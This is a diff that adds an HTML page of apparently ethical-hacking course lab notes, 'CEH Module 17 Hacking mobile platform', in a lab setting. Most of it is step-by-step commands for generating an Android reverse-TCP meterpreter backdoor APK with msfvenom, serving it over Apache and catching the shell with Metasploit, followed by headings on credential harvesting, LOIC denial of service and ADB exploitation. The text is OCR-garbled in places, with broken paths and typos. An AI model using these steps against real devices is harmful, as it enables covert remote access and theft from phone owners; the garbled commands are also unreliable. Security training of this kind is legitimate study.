@@ -1,0 +1,115 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>CEH Module 17 Hacking mobile platform</title>
+</head><body>Service postgresql start<br/>
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.13 R &gt; Desktop/Backdoor.apk<br/>
+mkdir /var/www/html/share/<br/>
+chmod -R 55 /var/www/heml/share/<br/>
+chown -R www-data:www-data /var/www/html/share/<br/>
+service apache2 start<br/>
+cp /root/Desktop/Backdoor.apk /var/www/html/share<br/>
+msfconsole<br/>
+use exploit/multi/handler<br/>
+set payload android/meterpreter/reverse_tcp<br/>
+set LHOST 10.10.10.13<br/>
+set LPORT 4444<br/>
+exploit -j -z<br/>
+<br/>
+<br/>
+Exploit the vulnerabilities in an Android device<br/>
+<br/>
+<br/>
+Obtain users' credentials<br/>
+<br/>
+<br/>
+Hack Android device with a malicious application<br/>
+<br/>
+<br/>
+Use an Android device to launch a DoS attack on a target<br/>
+<br/>
+<br/>
+Exploit an Android device through ADB<br/>
+<br/>
+<br/>
+Perform a security assessment on an Android device<br/>
+<br/>
+<br/>
+Hack an Android device by creating binary payloads using Parrot Security<br/>
+<br/>
+In this task, we will use Metasploit to create a binary payload in Parrot Security<br/>
+to hack an Android device.<br/>
+<br/>
+Switch to the Parrot Security virtual machine. In the login page, the<br/>
+attacker usernamewill be selected by default. Enter password as toor in<br/>
+the Password field and press Enter to log in to the machine.<br/>
+<br/>
+In the Parrot Terminal window, type service postgresql start and press<br/>
+Enter to start the database service.<br/>
+<br/>
+<br/>
+Type msfvenom -p android/meterpreter/reverse_tcp --platform<br/>
+android -a dalvik LHOST=1 0.1 0.10.13 R &gt; Desktop/Backdoor.apk and<br/>
+press Enter to generate a backdoor, or reverse meterpreter application.<br/>
+<br/>
+Type cp /root/Desktop/Backdoor.apk /var/wwwlhtml/sharel and press Enter<br/>
+to copy the fue to the share folder.<br/>
+<br/>
+Now, type service apache2 start and press Enter to start the Apache<br/>
+web server.<br/>
+<br/>
+Type msfconsole and press Enter to launch the Metasploit framework.<br/>
+In msfconsole, type use exploit/multi/handler and press Enter.<br/>
+<br/>
+Now, issue the following commands in msfconsole:<br/>
+<br/>
+Type set payload android/meterpreter/reverse_tcp and press<br/>
+Enter.<br/>
+Type set LHOST 10.10.10.13 and press Enter .<br/>
+Type showoptions and press Enter. This command lets you know<br/>
+the listening port (in this case, 4444), as shown in the screenshot.<br/>
+<br/>
+Type exploit -j -z and press Enter. This command runs the exploit as a<br/>
+background job<br/>
+<br/>
+Switch back to the Parrot Security virtual machine. The meterpreter<br/>
+session has been opened successfully, as shown in the screenshot.<br/>
+<br/>
+Type sessions -i 1 and press Enter. The Meterpreter shell is launched as<br/>
+shown in the screenshot.<br/>
+<br/>
+Type cd /sdcard to change the current remote directory to sdcard.<br/>
+N ote: The cd command changes the current remote directory.<br/>
+30. Now, type pwd and press Enter. Y ou will observe that the present<br/>
+worlcing directory has changed to sdcard, that is, /storage/emulated/0<br/>
+<br/>
+Now, still in the Meterpreter session, type ps and press Enter to view the<br/>
+processes running in the target system.<br/>
+Note: The list of running processes might differ in your lab environment.<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Harvest users' credentials using the Social-Engineer Toolkit<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Launch a DoS attack on a target machirre using Low Orbital Cannon<br/>
+(LOIC) on the Android mobile platform<br/>
+Exploit the Android platform through ADB using PhoneSploit<br/>
+<br/>
+We will target the Android virtual machine (10.10.10.14) using the Parrot<br/>
+Security virttu'll machine.<br/>
+<br/>
+In the Tenninal window, type apt-get instaU adb and press Enter to install<br/>
+ADB.<br/>
+<br/>
+<br/>
+https://www.sisik.eu/apk-tool<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
